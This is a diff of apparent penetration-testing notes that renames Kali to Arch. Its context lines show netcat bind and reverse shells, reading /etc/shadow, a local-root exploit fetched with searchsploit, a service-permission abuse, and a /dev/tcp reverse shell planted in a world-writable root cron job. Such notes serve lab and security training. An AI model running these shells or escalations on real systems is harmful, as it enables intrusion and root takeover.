@@ -1,22 +1,22 @@
-Pentesting with Kali
+Pentesting with Arch
 
 
 # Netcat
 
-Kali              192.168.2.10
+Arch              192.168.2.10
 Windows           192.168.2.12
 
 # Chat
 Windows           nc -nlvp 4444
-Kali              nc -nv 192.168.2.12 4444
+Arch              nc -nv 192.168.2.12 4444
 
 # Bind shell
 Windows           nc -nlvp 4444 -e cmd.exe
-Kali              nc -nv 192.168.2.12 4444
+Arch              nc -nv 192.168.2.12 4444
 
 # Reverse shell
 Windows           nc -nlvp 4444
-Kali              nc -nv 192.168.2.12 4444 -e /bin/bash
+Arch              nc -nv 192.168.2.12 4444 -e /bin/bash
 ------------------------------------------------------------------------------------------------------
 
 # Ncat is part of the nmap package.
@@ -82,7 +82,7 @@ gcc -o exploit exploit.c                               # Compile exploit
 id                                                     # Show user/group permissions
 cat /etc/shadow
 
-Option 2 - using Kali
+Option 2 - using Arch
 searchsploit linux local root
 Mempodipper - Linux Local Root => 2.6.39 (32-bit & 64-bit)                /linux/local/18411.c
 cp /usr/share/exploitdb/platforms/linux/local/18411.c /tmp/
@@ -115,7 +115,7 @@ Note the path to executable
 cd to that directory
 icacls vulnapp.exe                                     # Misconfigured if the Everyone group has access
 
-Kali
+Arch
 cat adduser.c
 #include <stdlib.h>
 int main ()
@@ -148,7 +148,7 @@ Look for any cron jobs that are WORLD writable running at root.
 nano /etc/cron.hourly/test.sh
 bash -i >& /dev/tcp/<kali-ip>/443 0>&1
 
-Kali
+Arch
 nc -lvp 443
 Once the cron job runs, you should have a shell with root privs.
 id
@@ -166,7 +166,7 @@ Windows
 Open IE to <kali-ip>/exploit.html
 netstat -an:find “4444”                                # Look for a bind shell
 
-Kali
+Arch
 nc -v <target-IP> 4444
 ------------------------------------------------------------------------------------------------------
 
